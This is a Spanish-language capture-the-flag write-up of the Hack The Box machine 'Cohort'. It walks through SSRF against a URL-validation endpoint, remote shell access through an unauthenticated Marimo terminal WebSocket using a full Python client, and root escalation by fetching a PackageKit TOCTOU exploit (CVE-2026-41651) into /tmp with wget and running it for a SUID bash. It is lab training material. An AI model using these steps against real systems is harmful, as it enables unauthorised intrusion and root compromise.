# Cohort — Hack The Box

> **Plataforma:** Hack The Box  
> **Sistema:** Linux  
> **IP de la máquina:** `10.129.128.173`  
> **Dominio:** `cohort.htb`  
> **Acceso inicial:** SSRF + WebSocket de Marimo  
> **Escalada de privilegios:** PackageKit TOCTOU (CVE-2026-41651)  
> **Dificultad:** Easy (según el entorno HTB)

---

## 1. Reconocimiento

### 1.1. Añadir el dominio local

```bash
 echo '10.129.128.173 cohort.htb' | sudo tee -a /etc/hosts
```

El escaneo inicial de Nmap no mostró puertos abiertos: todos aparecían filtrados. En vez de insistir con escaneos completos, se continuó enumerando la aplicación web disponible en `https://cohort.htb/portal.html`.

### 1.2. Aplicación web

La página **Client Insights – Cohort Analytics** permite registrar una URL de origen y comprobar si es accesible. La solicitud del formulario se envía a:

```http
POST /api/validate HTTP/1.1
Host: cohort.htb
Content-Type: application/json
```

Cuerpo de ejemplo:

```json
{
  "url": "https://cohort.htb/portal.html",
  "format": "csv"
}
```

La respuesta JSON incluye campos como `fetched_status`, `content_type`, `preview` y `message`. Esto indica que el servidor realiza una petición a la URL proporcionada y devuelve información de la respuesta.

---

## 2. SSRF: descubrir servicios internos

Se utilizó **Burp Suite** para interceptar la petición `POST /api/validate`, enviarla a **Repeater** y modificar el campo `url`.

La primera prueba a `http://127.1:2718/` devolvió `Connection refused`, por lo que ese puerto no era el correcto.

Después se consultó el endpoint de estado interno:

```json
{
  "url": "http://127.1/status",
  "format": "csv"
}
```

En el campo `preview` de la respuesta apareció la configuración de upstreams de Nginx, incluido el servicio de notebooks:

```text
name: notebooks
host: nb-1be3782a8afd3ad5.cohort.htb
target: 127.0.0.1:8888
note: internal analyst workspace, not for external use
```

También aparecieron los upstreams `marketing` e `insights-api`. El dato importante para continuar fue el subdominio de notebooks, que apuntaba al servicio interno de Marimo en el puerto `8888`.

### 2.1. Resolver el subdominio

```bash
 echo '10.129.128.173 nb-1be3782a8afd3ad5.cohort.htb' | sudo tee -a /etc/hosts
```

Comprobación:

```bash
getent hosts nb-1be3782a8afd3ad5.cohort.htb
```

Si Firefox no abre la página, comprobar primero conectividad con `curl`. En este laboratorio la petición a la raíz devolvió una redirección `303 See Other` hacia `/auth/login`, lo que confirmó que el servidor respondía.

```bash
curl -k -i --connect-timeout 5 \
  --resolve nb-1be3782a8afd3ad5.cohort.htb:443:10.129.128.173 \
  https://nb-1be3782a8afd3ad5.cohort.htb/
```

`--resolve` fuerza la IP para esa petición concreta; no modifica la resolución de Firefox.

---

## 3. Acceso inicial: WebSocket de Marimo

El login web no fue necesario para probar el endpoint de terminal del servicio Marimo. Se intentó usar `websocat`, pero no estaba instalado y la máquina de ataque no resolvía GitHub. Como alternativa, se utilizó la librería Python `websocket-client` (importada como `websocket`).

Comprobar que está disponible:

```bash
python3 -c "import websocket; print('Librería disponible')"
```

Crear el cliente:

```bash
cat > wsclient.py <<'PY'
import ssl
import threading
import websocket

IP = "10.129.128.173"
HOST = "nb-1be3782a8afd3ad5.cohort.htb"

ws = websocket.create_connection(
    f"wss://{IP}/terminal/ws",
    host=HOST,
    origin=f"https://{HOST}",
    sslopt={
        "cert_reqs": ssl.CERT_NONE,
        "check_hostname": False
    },
    timeout=10
)

def receive():
    while True:
        try:
            data = ws.recv()
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            print(data, end="", flush=True)
        except Exception as e:
            print(f"\nConexión cerrada: {e}")
            break

threading.Thread(target=receive, daemon=True).start()

try:
    while True:
        cmd = input()
        if cmd.lower() == "exit":
            break
        ws.send(cmd + "\r")
finally:
    ws.close()
PY
```

Ejecutarlo:

```bash
python3 wsclient.py
```

Una vez dentro de la terminal remota, comprobar el usuario y leer la flag de usuario:

```bash
id
cat /home/marimo/user.txt
```

> **Nota:** se desactiva la verificación del certificado TLS en este script porque el servicio del laboratorio utiliza un certificado que no se validó localmente. No reutilizar esa opción como práctica general fuera del laboratorio.

---

## 4. Enumeración local

Desde la shell de `marimo`, comprobar los paquetes instalados relacionados con PackageKit:

```bash
dpkg -l | grep -i packagekit
```

En la máquina apareció, entre otros, el paquete:

```text
hi  packagekit  1.2.8-2ubuntu1.2  amd64
```

El estado `hi` indica que el paquete está instalado y marcado como retenido (`hold`). La versión coincidía con la ruta de escalada investigada para el laboratorio: la vulnerabilidad TOCTOU de PackageKit, CVE-2026-41651.

---

## 5. Escalada de privilegios: PackageKit TOCTOU

El exploit se descargó en Parrot desde el repositorio público del PoC. Como GitHub no resolvía por DNS, se forzó la resolución de `raw.githubusercontent.com` para la descarga:

```bash
curl --resolve raw.githubusercontent.com:443:185.199.108.133 \
  -fL https://raw.githubusercontent.com/Vozec/CVE-2026-41651/main/cve-2026-41651 \
  -o cve-2026-41651
```

Comprobar el archivo:

```bash
file cve-2026-41651
```

Se identificó como ejecutable ELF de Linux `x86-64`.

### 5.1. Transferir el PoC al objetivo

En Parrot, crear un directorio dedicado para la transferencia y copiar el ejecutable a él. En esta sesión el archivo descargado estaba en `/etc/cve-2026-41651`:

```bash
mkdir -p /tmp/cohort-transfer
cp /etc/cve-2026-41651 /tmp/cohort-transfer/exploit
cd /tmp/cohort-transfer
python3 -m http.server 8000 --bind 10.10.14.35
```

`10.10.14.35` era la IP de `tun0` en esta sesión HTB. Dejar el servidor HTTP en ejecución.

En la terminal de Marimo:

```bash
wget http://10.10.14.35:8000/exploit -O /tmp/exploit
chmod +x /tmp/exploit
file /tmp/exploit
```

La comprobación confirmó que el archivo transferido era el mismo ELF `x86-64`.

### 5.2. Ejecutar el exploit

Desde la shell de `marimo`, **sin usar `sudo`**:

```bash
/tmp/exploit
```

La salida observada incluyó:

```text
PK error 48: Failed to obtain authentication
SUCCESS - SUID bash at +2500ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
```

Aunque apareció el error de autenticación de PackageKit, el exploit confirmó que creó una Bash SUID. La shell resultante mostraba `euid=0(root)`, es decir, privilegios efectivos de root.

### 5.3. Leer la flag de root

Desde la shell SUID que abre el exploit:

```bash
cat /root/root.txt
```

Si la shell SUID sigue abierta, puede comprobarse también:

```bash
id
```

La salida esperada tras una explotación correcta debe mostrar `euid=0(root)`.

---

## 6. Resumen de la cadena de ataque

```text
https://cohort.htb/portal.html
        |
        v
POST /api/validate (Burp Repeater)
        |
        v
SSRF -> http://127.1/status
        |
        v
Descubrimiento de upstreams de Nginx
        |
        v
nb-1be3782a8afd3ad5.cohort.htb:8888 (Marimo)
        |
        v
WebSocket /terminal/ws
        |
        v
Shell como marimo -> user.txt
        |
        v
dpkg -l -> PackageKit 1.2.8-2ubuntu1.2
        |
        v
Transferencia del PoC CVE-2026-41651
        |
        v
Exploit TOCTOU -> Bash SUID (euid=0)
        |
        v
/root/root.txt
```

## 7. Lecciones aprendidas

- Una función que obtiene una URL proporcionada por el usuario puede convertirse en SSRF si no restringe correctamente destinos internos.
- Un endpoint de estado puede exponer nombres de host, upstreams y puertos internos.
- Si un subdominio no carga en el navegador, comprobar DNS y conectividad por separado con `getent`, `curl` y `--resolve`.
- Los endpoints WebSocket deben recibir la misma autenticación y autorización que las rutas HTTP equivalentes.
- Comprobar versiones de paquetes y estados con `dpkg -l` puede revelar posibles rutas de escalada.
- Para transferir herramientas a un objetivo, limitar el servidor HTTP a un directorio temporal dedicado y a la interfaz VPN correcta.
- Una salida de error no implica necesariamente que un exploit haya fallado: hay que comprobar el resultado real, por ejemplo `id` y `euid`.

---

## Referencias

- Writeup de Cohort: <https://lankylukeaus.github.io/machines/cohort.html>
- Repositorio del análisis técnico: <https://github.com/vinicius-omelo/HTB-Cohort>
- PoC de PackageKit CVE-2026-41651: <https://github.com/Vozec/CVE-2026-41651>

> **Nota de publicación:** no incluir las flags en texto en el repositorio. Sus valores pueden ser específicos de la instancia; obtenerlos desde `/home/marimo/user.txt` y `/root/root.txt` en la propia máquina.
